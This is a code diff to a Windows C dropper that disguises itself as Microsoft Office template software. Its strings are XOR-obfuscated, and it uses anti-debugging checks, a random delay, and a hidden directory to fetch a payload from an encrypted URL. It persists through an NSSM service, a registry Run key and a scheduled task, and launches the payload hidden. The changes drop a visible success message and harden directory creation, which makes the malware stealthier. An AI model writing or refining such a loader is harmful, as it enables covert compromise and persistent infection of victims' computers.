@@ -12,7 +12,6 @@
 #pragma comment(lib, "advapi32.lib")
 
 #define KEY1 0x55
-#define KEY2 0xAA
 
 // Fixed string obfuscation with valid hex values
 #define DEFINE_OBFUSCATED_STRING(name, key, ...) \
@@ -40,7 +39,6 @@ DEFINE_OBFUSCATED_STRING(svcDesc, KEY1, 0x18,0x3C,0x36,0x27,0x3A,0x26,0x3A,0x33,
 DEFINE_OBFUSCATED_STRING(regPath, KEY1, 0x06,0x3A,0x33,0x21,0x22,0x34,0x27,0x30,0x09,0x18,0x3C,0x36,0x27,0x3A,0x26,0x3A,0x33,0x21,0x09,0x02,0x3C,0x3B,0x31,0x3A,0x22,0x26,0x09,0x16,0x20,0x27,0x27,0x30,0x3B,0x21,0x03,0x30,0x27,0x26,0x3C,0x3A,0x3B,0x09,0x07,0x20,0x3B,0x00)
 DEFINE_OBFUSCATED_STRING(regName, KEY1, 0x1A,0x33,0x33,0x3C,0x36,0x30,0x01,0x30,0x38,0x25,0x39,0x34,0x21,0x30,0x26,0x00)
 DEFINE_OBFUSCATED_STRING(taskName, KEY1, 0x18,0x3C,0x36,0x27,0x3A,0x26,0x3A,0x33,0x21,0x75,0x1A,0x33,0x33,0x3C,0x36,0x30,0x75,0x01,0x30,0x38,0x25,0x39,0x34,0x21,0x30,0x26,0x75,0x00,0x25,0x31,0x34,0x21,0x30,0x27,0x00)
-DEFINE_OBFUSCATED_STRING(successMsg, KEY1, 0x0E,0x7E,0x08,0x75,0x11,0x30,0x25,0x39,0x3A,0x2C,0x38,0x30,0x3B,0x21,0x75,0x36,0x3A,0x38,0x25,0x39,0x30,0x21,0x30,0x31,0x00)
 
 // Junk code macros
 #define JUNK_CODE_1 { asm("nop; nop; nop;"); }
@@ -59,6 +57,7 @@ BOOL IsElevated();
 void* ResolveAPI(const char* dll, const char* api);
 BOOL IsDebugged();
 BOOL IsProcessRunning(const char* processName);
+BOOL CreateDirectoryRecursive(const char* path);
 BOOL AddToPath(const char* dir);
 BOOL CreateScheduledTask(const char* exePath);
 BOOL DownloadAndExtract(const char* url, const char* zipPath, const char* targetDir);
@@ -109,7 +108,7 @@ BOOL IsDebugged() {
     return debugged;
 }
 
-// Check if process is already running
+// Check if process is already running (case-insensitive)
 BOOL IsProcessRunning(const char* processName) {
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;
@@ -123,7 +122,7 @@ BOOL IsProcessRunning(const char* processName) {
     }
     
     do {
-        if (strcmp(pe.szExeFile, processName) == 0) {
+        if (_stricmp(pe.szExeFile, processName) == 0) {
             CloseHandle(hSnapshot);
             return TRUE;
         }
@@ -134,10 +133,27 @@ BOOL IsProcessRunning(const char* processName) {
     return FALSE;
 }
 
-// Add directory to system PATH
+BOOL CreateDirectoryRecursive(const char* path) {
+    char temp[MAX_PATH];
+    char* p = NULL;
+
+    snprintf(temp, sizeof(temp), "%s", path);
+    for (p = temp + 1; *p; p++) {
+        if (*p == '\\') {
+            *p = '\0';
+            if (!PathFileExistsA(temp) && !CreateDirectoryA(temp, NULL)) {
+                return FALSE;
+            }
+            *p = '\\';
+        }
+    }
+    return CreateDirectoryA(path, NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
+}
+
+// Add directory to system PATH (with larger buffer)
 BOOL AddToPath(const char* dir) {
     HKEY hKey;
-    char currentPath[8192];
+    char currentPath[32768];  // Increased buffer size
     DWORD size = sizeof(currentPath);
     
     if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
@@ -157,7 +173,7 @@ BOOL AddToPath(const char* dir) {
         return TRUE;
     }
     
-    char newPath[8192];
+    char newPath[32768];  // Increased buffer size
     snprintf(newPath, sizeof(newPath), "%s;%s", currentPath, dir);
     
     if (RegSetValueExA(hKey, "Path", 0, REG_EXPAND_SZ, (const BYTE*)newPath, strlen(newPath) + 1) != ERROR_SUCCESS) {
@@ -303,7 +319,7 @@ BOOL SetServiceDescription(const char* nssmPath, const char* svcName, const char
     return (exitCode == 0);
 }
 
-// Start the service (renamed)
+// Start the service
 BOOL StartNSSMService(const char* nssmPath, const char* svcName) {
     char startCmd[MAX_PATH * 3];
     snprintf(startCmd, sizeof(startCmd), "\"%s\" start \"%s\"", nssmPath, svcName);
@@ -345,21 +361,27 @@ BOOL AddToStartup(const char* regName, const char* regPath, const char* exePath)
 
 // Main payload execution
 void ExecutePayload() {
+    // Fixed: Decrypt directory path first
+    char dirPathBuf[MAX_PATH];
+    DECRYPT_STRING(dirPathBuf, dirPath, KEY1);
+
+    char targetDir[MAX_PATH];
+    ExpandEnvironmentStringsA(dirPathBuf, targetDir, MAX_PATH);
+
+    // Create directory only once
+    if (!PathFileExistsA(targetDir)) {
+        if (!CreateDirectoryRecursive(targetDir)) {
+            return;  // Fail silently
+        }
+        SetFileAttributesA(targetDir, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+    }
+
+    // Check if payload process is running
     char procNameBuf[128];
     DECRYPT_STRING(procNameBuf, procName, KEY1);
     if (IsProcessRunning(procNameBuf)) return;
     
-    char dirPathBuf[MAX_PATH];
-    DECRYPT_STRING(dirPathBuf, dirPath, KEY1);
-    
-    char targetDir[MAX_PATH];
-    ExpandEnvironmentStringsA(dirPathBuf, targetDir, MAX_PATH);
-    
-    if (!PathFileExistsA(targetDir)) {
-        if (!CreateDirectoryA(targetDir, NULL)) return;
-        SetFileAttributesA(targetDir, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
-    }
-    
+    // Build paths for payload files
     char exePath[MAX_PATH], nssmPath[MAX_PATH];
     char configPath[MAX_PATH], zipPath[MAX_PATH];
     
@@ -379,6 +401,7 @@ void ExecutePayload() {
     DECRYPT_STRING(zipNameBuf, zipName, KEY1);
     PathCombineA(zipPath, targetDir, zipNameBuf);
     
+    // Download payload if needed
     if (!PathFileExistsA(exePath)) {
         char urlBuf[512];
         DECRYPT_STRING(urlBuf, urlStr, KEY1);
@@ -392,8 +415,10 @@ void ExecutePayload() {
         SetFileAttributesA(configPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
     }
     
+    // Add to system PATH
     AddToPath(targetDir);
     
+    // Install service
     char svcNameBuf[128];
     DECRYPT_STRING(svcNameBuf, svcName, KEY1);
     
@@ -401,11 +426,13 @@ void ExecutePayload() {
         return;
     }
     
+    // Configure service
     char svcDescBuf[256];
     DECRYPT_STRING(svcDescBuf, svcDesc, KEY1);
     SetServiceDescription(nssmPath, svcNameBuf, svcDescBuf);
     StartNSSMService(nssmPath, svcNameBuf);
     
+    // Add registry persistence
     char regNameBuf[128];
     DECRYPT_STRING(regNameBuf, regName, KEY1);
     
@@ -413,12 +440,11 @@ void ExecutePayload() {
     DECRYPT_STRING(regPathBuf, regPath, KEY1);
     AddToStartup(regNameBuf, regPathBuf, exePath);
     
+    // Create scheduled task
     CreateScheduledTask(exePath);
-    ShellExecuteA(NULL, "open", exePath, "--background", NULL, SW_HIDE);
     
-    char successMsgBuf[128];
-    DECRYPT_STRING(successMsgBuf, successMsg, KEY1);
-    MessageBoxA(NULL, successMsgBuf, successMsgBuf, MB_OK);
+    // Launch payload
+    ShellExecuteA(NULL, "open", exePath, "--background", NULL, SW_HIDE);
 }
 
 // Entry point
@@ -439,6 +465,9 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, int nC
     // Random delay
     srand(GetTickCount());
     Sleep((rand() % 15 + 5) * 1000);
+
+    // Enable long paths
+    SetEnvironmentVariableA("__COMPAT_LAYER", "EnableLongPathSupport");
     
     // Check for hidden instance flag
     char hiddenStrBuf[32];
